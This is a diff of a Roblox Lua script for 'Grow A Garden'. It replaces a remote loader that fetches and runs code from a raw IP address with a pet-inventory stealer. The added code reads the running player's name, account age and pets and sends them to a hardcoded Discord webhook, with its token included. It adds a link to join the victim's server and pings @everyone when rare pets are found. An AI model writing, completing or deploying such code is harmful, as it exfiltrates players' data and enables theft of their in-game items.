@@ -1,2 +1,195 @@
-ID="8f06133c-4681-42be-95eb-5861adb35aa2";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- === CONFIG ===
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
+
+-- === PRIORITY PETS & VALUES ===
+local PRIORITY = {
+    ["Raccoon"] = "🦝",
+    ["Dragonfly"] = "🐉",
+    ["Mimic Octopus"] = "🐙",
+    ["Red Fox"] = "🦊",
+    ["Disco Bee"] = "🎵🐝",
+    ["Queen Bee"] = "👑🐝",
+    ["Lobster Thermidor"] = "🦞",
+    ["Golden Goose"] = "🥇🦢",
+    ["Kitsune"] = "🌸",
+    ["Corrupted Kitsune"] = "🦠",
+    ["Fennec Fox"] = "🐺",
+    ["T-Rex"] = "🦖"
+}
+
+local PRIORITY_VALUES = {
+    ["Raccoon"] = 250,
+    ["Dragonfly"] = 50,
+    ["Mimic Octopus"] = 30,
+    ["Red Fox"] = 10,
+    ["Disco Bee"] = 200,
+    ["Queen Bee"] = 20,
+    ["Lobster Thermidor"] = 30,
+    ["Golden Goose"] = 15,
+    ["Kitsune"] = 550,
+    ["Corrupted Kitsune"] = 10,
+    ["Fennec Fox"] = 100,
+    ["T-Rex"] = 35
+}
+
+-- === PETS ===
+local PETS = {
+    "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
+    "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
+    "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
+    "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
+    "Blood Kiwi","Blood Hedgehog","Moon Cat","Petal Bee","Tarantula Hawk","Moth","Ostrich",
+    "Peacock","Capybara","Scarlet Macaw","Meerkat","Sand Snake","Bald Eagle","Raptor",
+    "Triceratops","Pterodactyl","Stegosaurus","Parasaurolophus","Iguanodon","Pachycephalosaurus",
+    "Tanuki","Tanchozuru","Kodama","Corrupted Kodama","Sushi Bear","Hotdog Daschund","Seedling",
+    "Snail","Giant Ant","Caterpillar","Brown Mouse","Squirrel","Praying Mantis","Echo Frog",
+    "Chicken Zombie","Night Owl","Red Giant Ant","Cooked Owl","Butterfly","Mimic Octopus",
+    "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
+    "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
+    "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose",
+    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex"
+}
+
+-- Prepare lowercase keywords
+local PET_KEYWORDS = {}
+for _, name in ipairs(PETS) do
+    PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower()
+end
+
+local function isPet(name)
+    local lower = name:lower()
+    for _, keyword in ipairs(PET_KEYWORDS) do
+        if string.find(lower, keyword) then return true end
+    end
+    return false
+end
+
+local function getPriorityEmoji(name)
+    for petName, emoji in pairs(PRIORITY) do
+        if string.find(name:lower(), petName:lower()) then return emoji end
+    end
+    return nil
+end
+
+local function formatPetLine(name)
+    local emoji = getPriorityEmoji(name)
+    local baseValue = 0
+    for petName, petValue in pairs(PRIORITY_VALUES) do
+        if string.find(string.lower(name), string.lower(petName)) then
+            baseValue = petValue
+            break
+        end
+    end
+
+    -- Extract weight
+    local weight = 0
+    local kgMatch = string.match(name, "(%d+%.?%d*)%s*KG") or string.match(name, "(%d+%.?%d*)%s*kg")
+    if kgMatch then weight = tonumber(kgMatch) or 0 end
+
+    -- Extract age if present
+    local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
+    local ageText = ageMatch and ("[Age " .. ageMatch .. "]") or ""
+
+    -- Determine emoji for non-priority
+    if not emoji then
+        if weight >= 30 then
+            emoji = "💪"
+        else
+            emoji = "🐶"
+        end
+    end
+
+    return emoji .. " - " .. name .. " " .. ageText .. " → " .. baseValue .. "¢"
+end
+
+local function collectPets(container)
+    local items = {}
+    local hasPriorityPet = false
+    if not container then return {}, 0, false end
+    for _, obj in ipairs(container:GetChildren()) do
+        if obj:IsA("Tool") and isPet(obj.Name) then
+            table.insert(items, obj.Name)
+            if getPriorityEmoji(obj.Name) then
+                hasPriorityPet = true
+            end
+        end
+    end
+
+    local formatted = {}
+    local totalValue = 0
+    for _, name in ipairs(items) do
+        table.insert(formatted, formatPetLine(name))
+        for petName, petValue in pairs(PRIORITY_VALUES) do
+            if string.find(string.lower(name), string.lower(petName)) then
+                totalValue = totalValue + petValue
+                break
+            end
+        end
+    end
+
+    return formatted, totalValue, hasPriorityPet
+end
+
+-- Collect pets
+local backpack, backpackValue, hasPriorityBackpack = collectPets(player:FindFirstChild("Backpack"))
+local equipped, equippedValue, hasPriorityEquipped = collectPets(player.Character)
+local totalValue = backpackValue + equippedValue
+
+-- Ping if any priority pet exists
+local hasPriority = hasPriorityBackpack or hasPriorityEquipped
+local pingText = hasPriority and "--@everyone\n" or ""
+
+-- Create teleport line
+local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
+
+-- Combine ping + teleport for webhook content
+local contentText = pingText .. teleportLine
+
+-- Generate dynamic join URL for embed
+local serverURL = string.format(
+    "https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",
+    game.PlaceId,
+    game.JobId
+)
+
+-- Build Discord embed
+local description = "```Name: " .. player.Name .. "\n" ..
+                    "Executor: Delta\n" ..
+                    "Account Age: " .. player.AccountAge .. " days```" .. "\n" ..
+                    "💰 Kwarta nga nakuha\n" ..
+                    "```" .. totalValue .. "₱```" .. "\n" ..
+                    "🎒 Backpack\n" ..
+                    "```" ..
+                    (#backpack > 0 and table.concat(backpack, "\n") or "No pets found.") ..
+                    "```" .. "\n" ..
+                    "🏝️ Join with URL\n" ..
+                    "**[" .. game.JobId .. "](" .. serverURL .. ")**"
+
+-- Send webhook
+local payload = {
+    content = contentText,
+    embeds = {{
+        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+        description = description,
+        color = 3447003
+    }}
+}
+
+local json = HttpService:JSONEncode(payload)
+local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+if req then
+    pcall(function()
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    end)
+else
+    warn("❌ Your executor does not support HTTP requests.")
+end
